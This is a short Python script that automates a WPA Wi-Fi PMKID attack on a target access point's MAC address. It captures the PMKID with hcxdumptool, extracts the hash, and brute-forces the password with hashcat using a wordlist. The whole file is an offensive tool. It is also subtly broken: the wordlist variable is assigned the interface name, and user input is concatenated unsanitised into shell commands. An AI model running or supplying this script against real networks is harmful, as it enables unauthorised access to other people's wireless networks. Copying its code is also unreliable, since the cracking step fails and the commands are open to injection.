import os, sys
import argparse

def get_args():
  parser = argparse.ArgumentParser()
  parser.add_argument('-f', '--filter_file', required=False, action='store', help='FIlter file name', default="filtermac.txt")
  parser.add_argument('-p', '--pcap_file', required=False, action='store', help='Pcap file name', default="output.pcapng")
  parser.add_argument('-j', '--hash_file', required=False, action='store', help='Hash file name', default = "PMKID-hash")
  parser.add_argument('-d', '--dictionary', required=True, action='store', help='Dictionary', default="rockyou.txt")
  parser.add_argument('-i', '--mon_interface', required=True, action='store', help='Interface in monitor mode', default = "mon0")
  parser.add_argument('-m', '--mac', required=True, action='store', help='MAC')
  my_args = parser.parse_args()
  return my_args

args = get_args()
filter_file = args.filter_file
pcapng_file = args.pcap_file 
hash_file   = args.hash_file 
dicc_wpa    = args.mon_interface 
iface = args.mon_interface
mac = args.mac.replace(":","")

# Create filter file
os.system("echo "+mac+" > "+filter_file)

# Capturar PMKID
print("Do not stop the capture until you see [FOUND PMKID]")
os.system("hcxdumptool -i "+iface+" -o "+pcapng_file+" --enable_status=1 --filterlist="+filter_file+" --filtermode=2")

# Extraer hash
os.system("hcxpcaptool -z "+hash_file+" "+pcapng_file)

# Fuerza bruta
os.system("hashcat -a 0 -m 16800 "+hash_file+" "+dicc_wpa+" --force")
                                                                              
